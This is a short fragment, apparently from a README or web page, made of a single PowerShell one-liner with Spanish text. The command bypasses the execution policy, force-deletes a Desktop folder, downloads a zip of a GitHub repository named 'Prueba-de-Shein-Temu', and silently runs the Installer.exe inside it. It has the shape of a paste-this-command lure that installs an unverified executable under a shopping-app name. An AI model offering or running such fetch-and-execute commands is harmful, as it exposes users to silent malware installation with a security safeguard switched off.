...
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; $destDir = Join-Path ([Environment]::GetFolderPath('Desktop')) 'Prueba-de-Shein-Temu'; $zipFile = Join-Path $env:TEMP 'repo.zip'; if (Test-Path $destDir) { Remove-Item $destDir -Recurse -Force }; Invoke-WebRequest -Uri "https://github.com/Riutexu/Prueba-de-Shein-Temu/archive/refs/heads/main.zip" -OutFile $zipFile; Expand-Archive -Path $zipFile -DestinationPath "$env:TEMP\extract" -Force; Move-Item "$env:TEMP\extract\Prueba-de-Shein-Temu-main" $destDir; Remove-Item $zipFile; Remove-Item "$env:TEMP\extract" -Recurse -Force; if (Test-Path "$destDir\Installer.exe") { Start-Process -FilePath "$destDir\Installer.exe" -ArgumentList "/S" -Wait -WorkingDirectory $destDir } else { Write-Host "Error: Installer.exe no encontrado en el repositorio." -ForegroundColor Red }
```
